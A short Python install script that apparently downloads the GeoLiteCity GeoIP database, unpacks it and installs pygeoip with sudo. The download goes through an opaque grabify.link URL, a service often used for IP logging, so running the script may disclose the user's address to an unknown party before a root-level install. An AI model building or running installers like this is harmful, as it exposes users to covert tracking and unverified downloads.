import os
import time

def sleep_():
	time.sleep(5)
def installation():
	os.system("wget https://grabify.link/RNAXK3 ")
	sleep_()
	os.system("gunzip GeoLiteCity.dat.gz")
	sleep_()
	os.system("sudo pip install pygeoip")
installation()
